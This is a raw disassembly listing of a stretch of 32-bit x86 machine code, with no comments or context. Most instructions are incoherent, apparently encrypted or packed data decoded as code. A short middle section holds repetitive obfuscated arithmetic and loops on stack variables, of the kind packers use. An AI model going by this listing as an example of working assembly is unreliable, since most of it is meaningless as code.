  418bc3:	inc    ebp
  418bc4:	test   eax,0x9a184218
  418bc9:	mov    esp,0xa33358e6
  418bce:	sub    eax,0xe3ad4c48
  418bd3:	mov    eax,ds:0x4b5db912
  418bd8:	sbb    DWORD PTR [ecx],edx
  418bda:	jl     0x418baf
  418bdc:	xchg   esp,eax
  418bdd:	(bad)  
  418bde:	clc    
  418bdf:	pop    esi
  418be0:	ficomp WORD PTR [ecx]
  418be2:	enter  0xdd9c,0x55
  418be6:	or     DWORD PTR [ecx],ebp
  418be8:	and    eax,0x140b79e9
  418bed:	in     eax,0xb9
  418bef:	out    0xc8,al
  418bf1:	xchg   esi,eax
  418bf2:	scas   al,BYTE PTR es:[edi]
  418bf3:	pop    esi
  418bf4:	enter  0x7f59,0xf
  418bf8:	mov    esi,ebx
  418bfa:	scas   al,BYTE PTR es:[edi]
  418bfb:	xchg   ebx,eax
  418bfc:	nop
  418bfd:	icebp  
  418bfe:	test   ebx,eax
  418c00:	xor    BYTE PTR [esi+ebx*4-0x22b11fdf],dh
  418c07:	xor    eax,0x9aece261
  418c0c:	inc    esp
  418c0d:	nop
  418c0e:	xchg   BYTE PTR [edi+ebp*1+0x7a943eab],dl
  418c15:	imul   esp,DWORD PTR [ecx+0xd],0xffffffb7
  418c19:	mov    ebp,0x5f26cace
  418c1e:	pusha  
  418c1f:	ds push ds
  418c21:	jns    0x418bd1
  418c23:	ficomp WORD PTR ds:0x14d79247
  418c29:	mov    ecx,0x43a024b2
  418c2e:	nop
  418c2f:	push   eax
  418c30:	inc    edx
  418c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c32:	push   edx
  418c33:	xchg   ebx,eax
  418c34:	xchg   ebx,eax
  418c35:	add    cl,al
  418c37:	fcomi  st,st(3)
  418c39:	push   ebx
  418c3a:	adc    DWORD PTR [eax+0x28],esi
  418c3d:	push   DWORD PTR [ebp+0xe]
  418c40:	xchg   ebp,edi
  418c42:	pop    ebx
  418c43:	stos   BYTE PTR es:[edi],al
  418c44:	inc    ebp
  418c45:	enter  0x80e2,0x2d
  418c49:	mov    al,ds:0x260fb317
  418c4e:	inc    ebx
  418c4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c50:	retf   0x55ca
  418c53:	int    0x30
  418c55:	mov    eax,ds:0x7c27cec2
  418c5a:	rcr    eax,cl
  418c5c:	cld    
  418c5d:	repnz sbb eax,0x733ffb1e
  418c63:	sub    dl,bh
  418c65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c67:	pop    esp
  418c68:	inc    edi
  418c69:	sbb    al,0xdf
  418c6b:	mov    bl,0x8b
  418c6d:	inc    ebp
  418c6f:	ror    DWORD PTR [eax+0x7d],cl
  418c72:	shr    BYTE PTR [edi],cl
  418c74:	add    eax,DWORD PTR [eax-0x25fdad1b]
  418c7a:	pop    esp
  418c7b:	cmp    dl,0x7b
  418c7e:	dec    edx
  418c7f:	iret   
  418c80:	pop    ebx
  418c81:	das    
  418c82:	lahf   
  418c83:	xchg   esp,eax
  418c84:	repz jg 0x418c41
  418c87:	mov    ecx,DWORD PTR [edx-0x73]
  418c8a:	add    al,0xd3
  418c8c:	mov    ch,0xb3
  418c8e:	dec    esi
  418c8f:	pop    esi
  418c90:	daa    
  418c91:	jp     0x418cbf
  418c93:	inc    ebp
  418c94:	ficomp DWORD PTR [eax]
  418c96:	dec    ebx
  418c97:	add    al,al
  418c99:	sbb    eax,eax
  418c9b:	lds    edx,FWORD PTR [ecx-0x2c]
  418c9e:	bswap  edx
  418ca0:	in     al,dx
  418ca1:	xlat   BYTE PTR ds:[ebx]
  418ca2:	(bad)  
  418ca5:	inc    esp
  418ca6:	xchg   edx,eax
  418ca7:	shl    BYTE PTR [esi+0x25a81c44],1
  418cad:	lahf   
  418cae:	jno    0x418ca5
  418cb0:	mov    ds:0x5d645c88,eax
  418cb5:	cmp    eax,0xae644016
  418cba:	out    0xaa,eax
  418cbc:	out    dx,eax
  418cbd:	cmp    al,0x9a
  418cbf:	xor    eax,DWORD PTR [edi]
  418cc1:	leave  
  418cc2:	repz xor DWORD PTR [ebp+0x334d6be3],esi
  418cc9:	sub    DWORD PTR [eax-0x76],esi
  418ccc:	sub    BYTE PTR [ecx+0x1b],cl
  418ccf:	push   ss
  418cd0:	ins    DWORD PTR es:[edi],dx
  418cd1:	sahf   
  418cd2:	ror    DWORD PTR [edx+0x48],cl
  418cd5:	retf   
  418cd6:	xor    ebx,ebx
  418cd8:	icebp  
  418cd9:	lods   eax,DWORD PTR ds:[esi]
  418cda:	scas   eax,DWORD PTR es:[edi]
  418cdb:	push   ecx
  418cdc:	loop   0x418c8f
  418cde:	dec    ecx
  418cdf:	push   eax
  418ce0:	jge    0x418cbf
  418ce2:	mov    esp,0xa3e80c51
  418ce7:	addr16 push ebp
  418ce9:	mov    dl,0x2f
  418ceb:	dec    esp
  418cec:	(bad)  
  418ced:	icebp  
  418cee:	test   esi,ebp
  418cf0:	icebp  
  418cf1:	xor    ebp,esi
  418cf3:	sbb    ah,0x64
  418cf6:	dec    edi
  418cf7:	shl    esi,0x94
  418cfa:	adc    eax,0xb2ea0b46
  418cff:	pop    eax
  418d00:	xlat   BYTE PTR ds:[ebx]
  418d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d02:	imul   ecx
  418d04:	push   0xffffffdb
  418d06:	push   eax
  418d07:	pop    ss
  418d08:	ret    
  418d09:	pop    ss
  418d0a:	xchg   edi,eax
  418d0b:	rcl    BYTE PTR [edx+edx*8-0x7e5c4ad5],cl
  418d12:	cs rcl dl,0x38
  418d16:	inc    edx
  418d17:	push   ss
  418d18:	mov    ds:0x993716a7,al
  418d1d:	fnstenv [eax+0x3a]
  418d20:	mov    ebp,0x7eb69189
  418d25:	and    al,0x59
  418d27:	call   0x8bc:0xac24b567
  418d2e:	xor    dl,al
  418d30:	fsubr  QWORD PTR [eax-0x7b44d56]
  418d36:	jmp    0x4bff:0xaec5edff
  418d3d:	outs   dx,BYTE PTR ds:[esi]
  418d3e:	lahf   
  418d3f:	jo     0x418d0e
  418d41:	xchg   esp,eax
  418d42:	pop    edi
  418d43:	stos   DWORD PTR es:[edi],eax
  418d44:	clc    
  418d45:	sbb    BYTE PTR [edi-0x49906838],bh
  418d4b:	loop   0x418dc8
  418d4d:	and    eax,0xcb1defc9
  418d52:	jl     0x418da2
  418d54:	es jg  0x418d29
  418d57:	fisubr DWORD PTR [esi]
  418d59:	cmp    bl,bl
  418d5b:	adc    esp,edi
  418d5d:	pop    edi
  418d5e:	or     bl,BYTE PTR [edi]
  418d60:	jo     0x418d43
  418d62:	je     0x418dd0
  418d64:	or     al,0x74
  418d66:	int3   
  418d67:	jmp    DWORD PTR [ecx]
  418d69:	shl    BYTE PTR cs:[ecx],0xa6
  418d6d:	adc    al,0x93
  418d6f:	push   ecx
  418d70:	sar    BYTE PTR [eax-0x6d57b0fc],cl
  418d76:	fld    TBYTE PTR [edx-0x51]
  418d79:	cdq    
  418d7a:	mov    edx,DWORD PTR [edx]
  418d7c:	popf   
  418d7d:	jle    0x418da6
  418d7f:	mov    edx,0xd95f0f00
  418d84:	arpl   WORD PTR [ebp-0x257ce918],ax
  418d8a:	mov    bh,0x3d
  418d8c:	cs cwde 
  418d8e:	out    dx,eax
  418d8f:	out    dx,al
  418d90:	jl     0x418da8
  418d92:	mov    ecx,0x589d1561
  418d98:	and    ah,ah
  418d9a:	dec    esp
  418d9b:	cmp    eax,0xcc5de8ee
  418da0:	in     al,dx
  418da1:	lods   eax,DWORD PTR ds:[esi]
  418da2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418da3:	call   0xa247:0x94100c04
  418daa:	cdq    
  418dab:	push   edi
  418dac:	mov    esp,DWORD PTR [esi-0x28]
  418daf:	and    BYTE PTR [esi+0x2099f60],dh
  418db5:	aas    
  418db6:	retf   0x8c07
  418db9:	test   eax,0x3c8e0fe9
  418dbe:	je     0x418dd0
  418dc0:	pop    eax
  418dc1:	xlat   BYTE PTR ds:[ebx]
  418dc2:	out    dx,al
  418dc3:	cmc    
  418dc4:	and    al,0xd4
  418dc6:	xchg   ebx,eax
  418dc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dc8:	in     eax,dx
  418dc9:	repz ja 0x418d50
  418dcc:	adc    DWORD PTR [ecx],0x134d1110
  418dd2:	aaa    
  418dd3:	push   ds
  418dd4:	dec    esp
  418dd5:	or     al,0xfd
  418dd7:	push   esi
  418dd8:	hlt    
  418dd9:	loop   0x418e4a
  418ddb:	mov    ds:0xa71c952d,al
  418de0:	push   0x5f
  418de2:	(bad)  
  418de4:	cmp    al,0xb7
  418de6:	rol    DWORD PTR ds:0x474ebf6a,0x5f
  418ded:	mov    ds:0xcd435b5d,eax
  418df2:	jmp    0x56d0:0x56bee810
  418df9:	jb     0x418e5d
  418dfb:	pop    esp
  418dfc:	inc    esi
  418dfd:	xor    dl,BYTE PTR [edx]
  418dff:	jg     0x418e70
  418e01:	mov    ebp,edi
  418e03:	pop    es
  418e04:	sbb    al,0x5b
  418e06:	outs   dx,DWORD PTR ds:[esi]
  418e07:	cmp    eax,0x35a5a06d
  418e0c:	add    BYTE PTR ds:0xd8588c8d,cl
  418e12:	sub    eax,0x43debe59
  418e17:	cmp    dl,al
  418e19:	push   edi
  418e1a:	mov    esp,0x30245278
  418e1f:	test   eax,0x8168e6ff
  418e24:	inc    ebx
  418e25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e26:	aaa    
  418e27:	and    edi,eax
  418e29:	sub    DWORD PTR [ebx-0x7b],esp
  418e2c:	or     al,0x9e
  418e2e:	rol    DWORD PTR [eax+0x26],0x5a
  418e32:	sbb    eax,0x974c25fa
  418e37:	mov    edi,0x3398c238
  418e3c:	adc    edi,DWORD PTR [esi]
  418e3e:	mov    BYTE PTR [edi-0x64],al
  418e41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e42:	lods   eax,DWORD PTR ds:[esi]
  418e43:	mov    edx,0xd076a5e7
  418e48:	je     0x418e81
  418e4a:	or     al,BYTE PTR [ecx-0x6859e31f]
  418e50:	push   ss
  418e51:	scas   al,BYTE PTR es:[edi]
  418e52:	jbe    0x418e68
  418e54:	adc    BYTE PTR [edx],ah
  418e56:	jae    0x418e34
  418e58:	std    
  418e59:	sbb    eax,0x8f09125
  418e5e:	push   edi
  418e5f:	es int3 
  418e61:	or     al,0xb6
  418e63:	in     eax,0x37
  418e65:	jnp    0x418e98
  418e67:	jge    0x418e50
  418e69:	jne    0x418ee3
  418e6b:	shl    edi,1
  418e6d:	jl     0x418e8d
  418e6f:	dec    ebp
  418e70:	adc    al,0x7c
  418e72:	push   es
  418e73:	out    dx,al
  418e74:	sbb    cl,ch
  418e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e77:	mov    edx,0x10ef8ae4
  418e7c:	not    dh
  418e7e:	cmp    DWORD PTR [eax],ebp
  418e80:	add    DWORD PTR [edx+0x6],eax
  418e83:	es lahf 
  418e85:	pop    esp
  418e86:	add    ebp,0x8b2dc754
  418e8c:	mov    dl,0x2c
  418e8e:	adc    DWORD PTR ds:0x7ed2149b,ecx
  418e94:	add    DWORD PTR [ebp-0x6889c6ea],ebx
  418e9a:	bound  esp,QWORD PTR [esi+esi*8-0x72280ad8]
  418ea1:	pop    edi
  418ea2:	jle    0x418e89
  418ea4:	adc    eax,0x9242f191
  418ea9:	pop    ecx
  418eaa:	or     eax,0x2b36a57d
  418eaf:	mov    ah,0xc1
  418eb1:	lock fcomi st,st(7)
  418eb4:	out    0xc,eax
  418eb6:	fst    DWORD PTR [edx+0x6f26d525]
  418ebc:	aam    0xb9
  418ebe:	and    DWORD PTR [esi-0x74bc9bbd],edx
  418ec4:	test   BYTE PTR [eax+0x3776ca1c],bl
  418eca:	popf   
  418ecb:	xor    eax,DWORD PTR [ebp+0x5832dcb]
  418ed1:	jmp    0x418ecc
  418ed3:	stc    
  418ed4:	jle    0x418ed9
  418ed6:	sar    BYTE PTR [esi-0x1bdc0fdb],cl
  418edc:	imul   esp,DWORD PTR [ebx],0xb
  418edf:	imul   ecx,DWORD PTR [ecx],0xffffffc7
  418ee2:	test   al,0xec
  418ee4:	ret    0x840b
  418ee7:	in     al,0xf7
  418ee9:	inc    edx
  418eea:	sbb    BYTE PTR ds:0xf93eae76,bl
  418ef0:	or     DWORD PTR [ebx-0x59],edx
  418ef3:	cli    
  418ef4:	ds enter 0x485d,0xd2
  418ef9:	and    BYTE PTR [edx+esi*8],ch
  418efc:	ins    BYTE PTR es:[edi],dx
  418efd:	inc    esp
  418efe:	cs and eax,0x82d3e9b2
  418f04:	cwde   
  418f05:	jne    0x418f45
  418f07:	scas   eax,DWORD PTR es:[edi]
  418f08:	push   ss
  418f09:	ror    DWORD PTR ds:0x9bb559dd,cl
  418f0f:	or     al,0xbf
  418f11:	mov    bl,0x31
  418f13:	jecxz  0x418ec6
  418f15:	pop    esp
  418f16:	and    eax,0x50c85f1
  418f1b:	ffree  st(2)
  418f1d:	fwait
  418f1e:	mov    ch,bl
  418f20:	mov    ebx,0xf058c3d2
  418f25:	repz push cs
  418f27:	call   0x5a9331b9
  418f2c:	xor    DWORD PTR [ecx-0x7da8c74b],ecx
  418f32:	cmp    al,0x77
  418f34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f35:	std    
  418f36:	repnz pusha 
  418f38:	mov    esi,DWORD PTR [esi+0x43]
  418f3b:	and    edx,DWORD PTR gs:[ecx]
  418f3e:	inc    edx
  418f3f:	pop    esp
  418f40:	sub    al,0xf9
  418f42:	mov    dl,0x3f
  418f44:	push   ebp
  418f45:	pop    es
  418f46:	mov    bl,0x18
  418f48:	lds    ebx,FWORD PTR [edi-0x5ec15f44]
  418f4e:	push   edi
  418f4f:	enter  0x12e1,0x31
  418f53:	stos   BYTE PTR es:[edi],al
  418f54:	adc    al,0x3c
  418f56:	pop    edi
  418f57:	(bad)  
  418f5a:	mov    al,ds:0x560dbaa3
  418f5f:	mov    ebp,0xe5fff9a8
  418f64:	aad    0xc7
  418f66:	arpl   WORD PTR [esi-0x415c478b],si
  418f6c:	jns    0x418f9b
  418f6e:	or     eax,0x9a9da964
  418f73:	pop    ecx
  418f74:	jle    0x418f1f
  418f76:	or     BYTE PTR [edi+eiz*4+0x62],cl
  418f7a:	out    0x5f,al
  418f7c:	ins    DWORD PTR es:[edi],dx
  418f7d:	add    eax,0xb5707f90
  418f82:	sub    eax,0x66e8fcbd
  418f87:	cmp    eax,0x8fc08e87
  418f8c:	push   ebp
  418f8d:	jb     0x418fae
  418f8f:	addr16 inc esp
  418f91:	pop    ebx
  418f92:	icebp  
  418f93:	push   ebp
  418f94:	adc    ebx,DWORD PTR [esi]
  418f96:	jle    0x418ff5
  418f98:	inc    ecx
  418f99:	jmp    0x7827:0x57d968c
  418fa0:	xor    eax,0xa790881f
  418fa5:	stos   BYTE PTR es:[edi],al
  418fa6:	and    eax,DWORD PTR [ebp-0xde60ef2]
  418fac:	mov    fs,ebx
  418fae:	jecxz  0x418f98
  418fb0:	test   eax,0x8bc4b4c6
  418fb5:	sbb    eax,0x33fd1d21
  418fba:	fsubr  DWORD PTR [ebx]
  418fbc:	shr    DWORD PTR [ebx],cl
  418fbe:	(bad)  
  418fbf:	xor    edx,eax
  418fc1:	mov    DWORD PTR [ebp+0x8],edx
  418fc4:	mov    edx,DWORD PTR [ebp+0x8]
  418fc7:	mov    ebx,DWORD PTR [ebp-0x58]
  418fca:	add    edx,0x5708fa
  418fd0:	imul   edx,ebx
  418fd3:	mov    DWORD PTR [ebp-0x58],edx
  418fd6:	mov    edx,DWORD PTR [ebp+0x8]
  418fd9:	mov    ebx,DWORD PTR [ebp-0x54]
  418fdc:	add    edx,0x64f898
  418fe2:	or     edx,ebx
  418fe4:	mov    DWORD PTR [ebp-0x54],edx
  418fe7:	mov    edx,DWORD PTR [ebp+0x8]
  418fea:	mov    ebx,DWORD PTR [ebp-0x50]
  418fed:	add    edx,ecx
  418fef:	xor    edx,ebx
  418ff1:	mov    DWORD PTR [ebp-0x50],edx
  418ff4:	mov    edx,DWORD PTR [ebp+0x8]
  418ff7:	mov    ebx,DWORD PTR [ebp-0x4c]
  418ffa:	add    edx,edi
  418ffc:	and    edx,ebx
  418ffe:	mov    DWORD PTR [ebp-0x4c],edx
  419001:	mov    edx,DWORD PTR [ebp+0x8]
  419004:	mov    ebx,DWORD PTR [ebp-0x48]
  419007:	lea    edx,[ebx+edx*1+0x241fcdf]
  41900e:	mov    DWORD PTR [ebp-0x48],edx
  419011:	mov    edx,DWORD PTR [ebp+0x8]
  419014:	mov    ebx,0xfa5e1524
  419019:	sub    ebx,edx
  41901b:	add    ebx,DWORD PTR [ebp-0x44]
  41901e:	mov    DWORD PTR [ebp-0x44],ebx
  419021:	mov    edx,DWORD PTR [ebp+0x8]
  419024:	xor    edx,eax
  419026:	add    edx,esi
  419028:	jne    0x416c52
  41902e:	jmp    0x4190bb
  419033:	mov    edx,DWORD PTR [ebp-0x14]
  419036:	mov    DWORD PTR [ebp+0x8],edx
  419039:	jmp    0x4190ae
  41903e:	mov    edx,DWORD PTR [ebp+0x8]
  419041:	mov    ebx,DWORD PTR [ebp-0x8]
  419044:	xor    edx,eax
  419046:	xor    ebx,eax
  419048:	sub    edx,ebx
  41904a:	sub    edx,esi
  41904c:	xor    edx,eax
  41904e:	mov    DWORD PTR [ebp+0x8],edx
  419051:	mov    edx,DWORD PTR [ebp+0x8]
  419054:	mov    ebx,DWORD PTR [ebp-0x58]
  419057:	add    edx,0x5708fa
  41905d:	imul   edx,ebx
  419060:	mov    DWORD PTR [ebp-0x58],edx
  419063:	mov    edx,DWORD PTR [ebp+0x8]
  419066:	mov    ebx,DWORD PTR [ebp-0x54]
  419069:	add    edx,0x64f898
  41906f:	or     edx,ebx
  419071:	mov    DWORD PTR [ebp-0x54],edx
  419074:	mov    edx,DWORD PTR [ebp+0x8]
  419077:	mov    ebx,DWORD PTR [ebp-0x50]
  41907a:	add    edx,ecx
  41907c:	xor    edx,ebx
  41907e:	mov    DWORD PTR [ebp-0x50],edx
  419081:	mov    edx,DWORD PTR [ebp+0x8]
  419084:	mov    ebx,DWORD PTR [ebp-0x4c]
  419087:	add    edx,edi
  419089:	and    edx,ebx
  41908b:	mov    DWORD PTR [ebp-0x4c],edx
  41908e:	mov    edx,DWORD PTR [ebp+0x8]
  419091:	mov    ebx,DWORD PTR [ebp-0x48]
  419094:	lea    edx,[ebx+edx*1+0x241fcdf]
  41909b:	mov    DWORD PTR [ebp-0x48],edx
  41909e:	mov    edx,DWORD PTR [ebp+0x8]
  4190a1:	mov    ebx,0xfa5e1524
  4190a6:	sub    ebx,edx
  4190a8:	add    ebx,DWORD PTR [ebp-0x44]
  4190ab:	mov    DWORD PTR [ebp-0x44],ebx
  4190ae:	mov    edx,DWORD PTR [ebp+0x8]
  4190b1:	xor    edx,eax
  4190b3:	add    edx,esi
  4190b5:	jne    0x41903e
  4190bb:	mov    edx,DWORD PTR [ebp-0x14]
  4190be:	mov    DWORD PTR [ebp+0x8],edx
  4190c1:	jmp    0x41b495
  4190c6:	mov    edx,DWORD PTR [ebp+0x8]
  4190c9:	mov    ebx,DWORD PTR [ebp-0x8]
  4190cc:	xor    edx,eax
  4190ce:	xor    ebx,eax
  4190d0:	sub    edx,ebx
  4190d2:	sub    edx,esi
  4190d4:	xor    edx,eax
  4190d6:	mov    DWORD PTR [ebp+0x8],edx
  4190d9:	jmp    0x41b438
  4190de:	adc    esp,DWORD PTR [eax-0x55]
  4190e1:	jl     0x419063
  4190e3:	mov    eax,0x95ec0084
  4190e8:	bound  ebp,QWORD PTR [ecx+0xc]
  4190eb:	cmp    ebp,DWORD PTR [ebp+ebp*8-0x7c83e2cd]
  4190f2:	cmp    eax,0x1983835e
  4190f7:	mov    eax,ds:0x85d28ce0
  4190fc:	adc    ebp,esp
  4190fe:	and    eax,0x59cd000a
  419103:	sbb    ebx,DWORD PTR ds:0x4413eeb8
  419109:	add    BYTE PTR [ebp-0x3fa6c89d],cl
  41910f:	mov    ss,WORD PTR [esi-0x59]
  419112:	cmp    al,0xbe
  419114:	out    0xe2,al
  419116:	xchg   edi,eax
  419117:	and    al,0x90
  419119:	jo     0x419195
  41911b:	scas   eax,DWORD PTR es:[edi]
  41911c:	mov    ch,0x1f
  41911e:	mov    ds:0x6f6a345d,eax
  419123:	(bad)  [edi+0x3]
  419126:	cld    
  419127:	imul   DWORD PTR [esi+0x36]
  41912a:	and    ecx,DWORD PTR [esi+0x7fc37b1d]
  419130:	inc    eax
  419131:	stos   DWORD PTR es:[edi],eax
  419132:	adc    al,0x95
  419134:	popa   
  419135:	mov    ds:0xb1a75bf2,al
  41913a:	pop    esi
  41913b:	sub    cl,al
  41913d:	sub    bh,BYTE PTR [ecx+0x13]
  419140:	repz fsub QWORD PTR [ebx+0x7b]
  419144:	add    DWORD PTR [esi],ecx
  419146:	cwde   
  419147:	adc    DWORD PTR [ecx+0x2f],0x54
  41914b:	not    BYTE PTR [ecx-0x16]
  41914e:	outs   dx,BYTE PTR ds:[esi]
  41914f:	xor    DWORD PTR [edi],ecx
  419151:	outs   dx,DWORD PTR ds:[esi]
  419152:	pop    ebx
  419153:	cmp    dh,BYTE PTR [edx]
  419155:	fucomp st(6)
  419157:	xchg   ecx,eax
  419158:	add    DWORD PTR [eax+ebx*8-0x2b],esi
  41915c:	retf   
  41915d:	stos   BYTE PTR es:[edi],al
  41915e:	mov    cl,0x85
  419160:	rcr    BYTE PTR [ebp+0x0],0xc1
  419164:	dec    esp
  419165:	psubusb mm7,QWORD PTR [ecx+0x3e]
  419169:	gs pop esp
  41916b:	mov    cl,0x64
  41916d:	jns    0x419119
  41916f:	pusha  
  419170:	or     ebx,DWORD PTR [ecx-0x27]
  419173:	shl    BYTE PTR [edi+edi*2+0x51],0x75
  419178:	add    eax,0xeb1ef905
  41917d:	push   esp
  41917e:	cld    
  41917f:	jne    0x4191ee
  419181:	sub    ch,BYTE PTR [eax+0x67975659]
  419187:	inc    ebx
  419188:	pop    ecx
  419189:	mov    ebx,0x78a683da
  41918e:	leave  
  41918f:	push   eax
  419190:	stos   BYTE PTR es:[edi],al
  419191:	push   0x10791dd6
  419196:	pop    ds
  419197:	out    dx,eax
  419198:	fsubr  QWORD PTR [ebx-0x42c0b81c]
  41919e:	or     ebp,DWORD PTR [edx+0x5e]
  4191a1:	push   es
  4191a2:	xchg   esp,eax
  4191a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191a4:	cmc    
  4191a5:	pop    ds
  4191a6:	push   ss
  4191a7:	icebp  
  4191a8:	mov    bl,0x80
  4191aa:	mov    DWORD PTR [ebx],ecx
  4191ac:	daa    
  4191ad:	iret   
  4191ae:	mov    edi,0x82ec7e0e
  4191b3:	or     eax,0xcb72ef46
  4191b8:	mov    WORD PTR [esi],fs
  4191ba:	dec    ecx
  4191bb:	fadd   st(4),st
  4191bd:	jbe    0x4191df
  4191bf:	and    eax,0xdf72d7c3
  4191c4:	dec    eax
  4191c5:	outs   dx,DWORD PTR ds:[esi]
  4191c6:	inc    edx
  4191c7:	xchg   ebp,eax
  4191c8:	jg     0x419209
  4191ca:	mov    esp,0x14f0edf2
  4191cf:	cmp    al,0xff
  4191d1:	jb     0x419171
  4191d3:	xor    esi,DWORD PTR [ebp+0x5fdeb47b]
  4191d9:	add    BYTE PTR [eax+0x63],cl
  4191dc:	push   es
  4191dd:	jne    0x4191fd
  4191df:	xchg   esi,eax
  4191e0:	out    dx,eax
  4191e1:	jmp    0x9ad30da3
  4191e6:	dec    al
  4191e8:	and    dl,BYTE PTR ds:0xec515caf
  4191ee:	push   0x1c230517
  4191f3:	mov    ebp,0x46facd0a
  4191f8:	xor    al,BYTE PTR [esi]
  4191fa:	add    al,0x8c
  4191fc:	mov    al,ds:0x91e5787e
  419201:	xor    DWORD PTR [esi+0x15dac0e4],eax
  419207:	in     eax,dx
  419208:	mov    ecx,0x76856390
  41920d:	(bad)  
  41920e:	jmp    0x433f380b
  419213:	jmp    0xc60e848b
  419218:	inc    ebp
  419219:	nop
  41921a:	or     cl,dh
  41921c:	mov    edi,0xe2264cb3
  419221:	daa    
  419222:	mov    BYTE PTR [ecx+0x47],bl
  419225:	repnz inc esi
  419227:	push   ebp
  419228:	enter  0xa4f7,0x9e
  41922c:	ret    0x297d
  41922f:	stos   DWORD PTR es:[edi],eax
  419230:	ds mov dl,bh
  419233:	call   0x6d41bf92
  419238:	popf   
  419239:	adc    bl,BYTE PTR [edx]
  41923b:	enter  0xd03e,0x2f
  41923f:	dec    ecx
  419240:	lds    edi,FWORD PTR [esi]
  419242:	sti    
  419243:	fnstcw WORD PTR [edx]
  419245:	xor    DWORD PTR [ebp+0x20],eax
  419248:	xor    ebp,edx
  41924a:	xchg   DWORD PTR [ecx],ebp
  41924c:	cmp    DWORD PTR [edx+0x59],esi
  41924f:	adc    BYTE PTR [ebx-0x5f4168af],ah
  419255:	pop    esp
  419256:	push   0x72b9fd95
  41925b:	inc    edi
  41925c:	sub    eax,0x4d4c47d6
  419261:	and    al,cl
  419263:	xor    al,0x72
  419265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419266:	and    cl,BYTE PTR [ebx-0x9]
  419269:	mov    dl,0xfc
  41926b:	add    ch,dl
  41926d:	or     eax,0x4284c629
  419272:	jg     0x419208
  419274:	xor    BYTE PTR [esi],0x12
  419277:	ds inc edx
  419279:	outs   dx,BYTE PTR ds:[esi]
  41927a:	jmp    0x41929a
  41927c:	ret    0x6c9e
  41927f:	dec    edx
  419280:	mov    bh,0xf8
  419282:	sbb    BYTE PTR [esp+ebx*1],0xf
  419286:	loopne 0x4192de
  419288:	push   ecx
  419289:	popf   
  41928a:	shr    DWORD PTR cs:[ecx+0x15],0xe6
  41928f:	test   BYTE PTR [ebx-0x42ac333f],ah
  419295:	or     cl,BYTE PTR [ebx+0x3b227c2b]
  41929b:	arpl   cx,ax
  41929d:	dec    ebp
  41929e:	push   ds
  41929f:	cdq    
  4192a0:	bound  esp,QWORD PTR [ecx-0x77c3e6a2]
  4192a6:	in     eax,0x47
  4192a8:	push   es
  4192a9:	in     eax,dx
  4192aa:	call   0x34b5:0x8d3169d0
  4192b1:	xor    eax,ebx
  4192b3:	mov    esp,0x42bde243
  4192b8:	out    0x52,al
  4192ba:	push   edi
  4192bb:	les    ecx,FWORD PTR [ecx]
  4192bd:	int3   
  4192be:	cmp    al,0x35
  4192c0:	mov    edx,0x7cd553c8
  4192c5:	fisubr WORD PTR [ebx+0x30f2f1a5]
  4192cb:	loopne 0x419251
  4192cd:	cmp    bh,dh
  4192cf:	(bad)  
  4192d0:	clc    
  4192d1:	sbb    eax,0x6ffcefc5
  4192d6:	idiv   DWORD PTR [ebx]
  4192d8:	jl     0x4192b2
  4192da:	sub    BYTE PTR [edi],dh
  4192dc:	jae    0x4192c7
  4192de:	xor    esi,DWORD PTR [esi+0x34]
  4192e1:	test   ebp,0x31b8f58
  4192e7:	popa   
  4192e8:	imul   ebx,DWORD PTR [edx],0x4
  4192eb:	mov    dl,0x63
  4192ed:	ror    DWORD PTR ds:0xff29ac7,0x1a
  4192f4:	sbb    BYTE PTR [esi+esi*4+0x7fa3f272],0x9e
  4192fc:	push   0xb5416f1c
  419301:	into   
  419302:	ja     0x419302
  419304:	xchg   eax,edx
  419306:	fisttp DWORD PTR [edx+0xb39560f]
  41930c:	fiadd  DWORD PTR [ebx]
  41930e:	dec    ebx
  41930f:	cs into 
  419311:	pop    esi
  419312:	aam    0x8f
  419314:	fild   WORD PTR [edi+ebx*1]
  419317:	xchg   edx,eax
  419318:	push   ebp
  419319:	jne    0x419321
  41931b:	fsub   st(1),st
  41931d:	jne    0x4192bd
  41931f:	dec    edi
  419320:	push   cs
  419321:	rcr    BYTE PTR [esi-0x7054f9a6],cl
  419327:	push   esi
  419328:	mov    dh,0x11
  41932a:	mov    ebx,0x2df295de
  41932f:	outs   dx,DWORD PTR ds:[esi]
  419330:	sub    eax,0x41c41435
  419335:	dec    esp
  419336:	adc    dh,al
  419338:	cmp    al,0xba
  41933a:	jb     0x419399
  41933c:	and    al,0xe1
  41933e:	in     al,dx
  41933f:	jecxz  0x419341
  419341:	mov    esi,0xf79d6817
  419346:	cli    
  419347:	lods   al,BYTE PTR ds:[esi]
  419348:	push   eax
  419349:	mov    ss,WORD PTR [edi+0x2a]
  41934c:	inc    esp
  41934d:	xor    eax,0x72503dfd
  419352:	xchg   ebp,eax
  419353:	mov    edx,0xe73f58fd
  419358:	test   al,0x92
  41935a:	in     al,0xa0
  41935c:	sti    
  41935d:	fisttp QWORD PTR [esi-0x218b4110]
  419363:	enter  0xff31,0xac
  419367:	out    dx,al
  419368:	xchg   edi,esi
  41936a:	mov    ah,0x76
  41936c:	icebp  
  41936d:	loop   0x419367
  41936f:	fwait
  419370:	call   0x76f30be2
  419375:	mov    dl,0xef
  419377:	sub    DWORD PTR [edi+edx*1],ebp
  41937a:	fild   WORD PTR [ebp-0x3f]
  41937d:	cmc    
  41937e:	and    ebx,edi
  419380:	cwde   
  419381:	add    edi,DWORD PTR [edx]
  419383:	addr16 in eax,dx
  419385:	dec    ebx
  419386:	jb     0x419317
  419388:	add    al,0x12
  41938a:	in     eax,0xb3
  41938c:	pop    esp
  41938d:	dec    ecx
  41938e:	popf   
  41938f:	xlat   BYTE PTR ds:[ebx]
  419390:	pop    eax
  419391:	cmp    eax,0xbfa19990
  419396:	pop    edx
